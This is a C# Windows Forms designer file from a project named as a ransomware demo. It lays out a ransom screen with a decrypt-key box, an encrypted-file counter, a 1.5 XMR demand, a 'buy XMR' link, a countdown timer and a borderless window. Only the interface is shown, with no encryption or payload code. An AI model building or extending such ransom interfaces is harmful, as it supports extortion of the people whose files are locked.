namespace RanWare_Demomot
{
    partial class Form1
    {
        /// <summary>
        ///  Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        ///  Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        ///  Required method for Designer support - do not modify
        ///  the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.btnDecrypt = new System.Windows.Forms.Button();
            this.txtBoxInput = new System.Windows.Forms.TextBox();
            this.lblTextMessage = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.lblTextFile = new System.Windows.Forms.Label();
            this.lblNbr = new System.Windows.Forms.Label();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.linkLabel1 = new System.Windows.Forms.LinkLabel();
            this.btnStop = new System.Windows.Forms.Button();
            this.timer = new System.Windows.Forms.Timer(this.components);
            this.lblTime = new System.Windows.Forms.Label();
            this.lblAmount = new System.Windows.Forms.Label();
            this.lblXMR = new System.Windows.Forms.Label();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            this.SuspendLayout();
            // 
            // btnDecrypt
            // 
            this.btnDecrypt.Location = new System.Drawing.Point(558, 465);
            this.btnDecrypt.Name = "btnDecrypt";
            this.btnDecrypt.Size = new System.Drawing.Size(75, 23);
            this.btnDecrypt.TabIndex = 0;
            this.btnDecrypt.Text = "Decrypt :)";
            this.btnDecrypt.UseVisualStyleBackColor = true;
            this.btnDecrypt.Click += new System.EventHandler(this.btnDecrypt_Click);
            // 
            // txtBoxInput
            // 
            this.txtBoxInput.Location = new System.Drawing.Point(244, 465);
            this.txtBoxInput.Name = "txtBoxInput";
            this.txtBoxInput.Size = new System.Drawing.Size(100, 23);
            this.txtBoxInput.TabIndex = 1;
            // 
            // lblTextMessage
            // 
            this.lblTextMessage.Font = new System.Drawing.Font("Times New Roman", 20.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
            this.lblTextMessage.ForeColor = System.Drawing.Color.White;
            this.lblTextMessage.Location = new System.Drawing.Point(244, 9);
            this.lblTextMessage.Name = "lblTextMessage";
            this.lblTextMessage.Size = new System.Drawing.Size(950, 372);
            this.lblTextMessage.TabIndex = 2;
            this.lblTextMessage.Text = resources.GetString("lblTextMessage.Text");
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(31, 9);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(121, 130);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 3;
            this.pictureBox1.TabStop = false;
            // 
            // lblTextFile
            // 
            this.lblTextFile.AutoSize = true;
            this.lblTextFile.ForeColor = System.Drawing.Color.White;
            this.lblTextFile.Location = new System.Drawing.Point(1, 164);
            this.lblTextFile.Name = "lblTextFile";
            this.lblTextFile.Size = new System.Drawing.Size(165, 15);
            this.lblTextFile.TabIndex = 4;
            this.lblTextFile.Text = "Nombre de fichiers encryptés:";
            // 
            // lblNbr
            // 
            this.lblNbr.AutoSize = true;
            this.lblNbr.BackColor = System.Drawing.Color.DarkRed;
            this.lblNbr.ForeColor = System.Drawing.Color.White;
            this.lblNbr.Location = new System.Drawing.Point(171, 164);
            this.lblNbr.Name = "lblNbr";
            this.lblNbr.Size = new System.Drawing.Size(0, 15);
            this.lblNbr.TabIndex = 5;
            // 
            // pictureBox2
            // 
            this.pictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox2.Image")));
            this.pictureBox2.Location = new System.Drawing.Point(26, 194);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(140, 121);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox2.TabIndex = 6;
            this.pictureBox2.TabStop = false;
            // 
            // linkLabel1
            // 
            this.linkLabel1.AutoSize = true;
            this.linkLabel1.Location = new System.Drawing.Point(268, 396);
            this.linkLabel1.Name = "linkLabel1";
            this.linkLabel1.Size = new System.Drawing.Size(76, 15);
            this.linkLabel1.TabIndex = 7;
            this.linkLabel1.TabStop = true;
            this.linkLabel1.Text = "Acheter XMR";
            this.linkLabel1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel1_LinkClicked);
            // 
            // btnStop
            // 
            this.btnStop.AutoSize = true;
            this.btnStop.Location = new System.Drawing.Point(992, 463);
            this.btnStop.Name = "btnStop";
            this.btnStop.Size = new System.Drawing.Size(96, 25);
            this.btnStop.TabIndex = 8;
            this.btnStop.Text = "Stop the music";
            this.btnStop.UseVisualStyleBackColor = true;
            this.btnStop.Click += new System.EventHandler(this.btnStop_Click);
            this.btnStop.MouseEnter += new System.EventHandler(this.btnStop_MouseEnter);
            // 
            // timer
            // 
            this.timer.Enabled = true;
            this.timer.Interval = 1000;
            this.timer.Tick += new System.EventHandler(this.timer_Tick);
            // 
            // lblTime
            // 
            this.lblTime.AutoSize = true;
            this.lblTime.Font = new System.Drawing.Font("Times New Roman", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
            this.lblTime.ForeColor = System.Drawing.Color.White;
            this.lblTime.Location = new System.Drawing.Point(31, 362);
            this.lblTime.Name = "lblTime";
            this.lblTime.Size = new System.Drawing.Size(0, 19);
            this.lblTime.TabIndex = 9;
            // 
            // lblAmount
            // 
            this.lblAmount.AutoSize = true;
            this.lblAmount.Font = new System.Drawing.Font("Times New Roman", 20.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
            this.lblAmount.ForeColor = System.Drawing.Color.White;
            this.lblAmount.Location = new System.Drawing.Point(371, 164);
            this.lblAmount.Name = "lblAmount";
            this.lblAmount.Size = new System.Drawing.Size(56, 31);
            this.lblAmount.TabIndex = 10;
            this.lblAmount.Text = "1.5 ";
            // 
            // lblXMR
            // 
            this.lblXMR.AutoSize = true;
            this.lblXMR.Font = new System.Drawing.Font("Times New Roman", 20.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
            this.lblXMR.ForeColor = System.Drawing.Color.White;
            this.lblXMR.Location = new System.Drawing.Point(451, 164);
            this.lblXMR.Name = "lblXMR";
            this.lblXMR.Size = new System.Drawing.Size(78, 31);
            this.lblXMR.TabIndex = 11;
            this.lblXMR.Text = "XMR";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.DarkRed;
            this.ClientSize = new System.Drawing.Size(1229, 500);
            this.Controls.Add(this.lblXMR);
            this.Controls.Add(this.lblAmount);
            this.Controls.Add(this.lblTime);
            this.Controls.Add(this.btnStop);
            this.Controls.Add(this.linkLabel1);
            this.Controls.Add(this.pictureBox2);
            this.Controls.Add(this.lblNbr);
            this.Controls.Add(this.lblTextFile);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.lblTextMessage);
            this.Controls.Add(this.txtBoxInput);
            this.Controls.Add(this.btnDecrypt);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Form1";
            this.Text = "Petit Poney";
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private Button btnDecrypt;
        private TextBox txtBoxInput;
        private Label lblTextMessage;
        private PictureBox pictureBox1;
        private Label lblTextFile;
        private Label lblNbr;
        private PictureBox pictureBox2;
        private LinkLabel linkLabel1;
        private Button btnStop;
        private System.Windows.Forms.Timer timer;
        private Label lblTime;
        private Label lblAmount;
        private Label lblXMR;
    }
}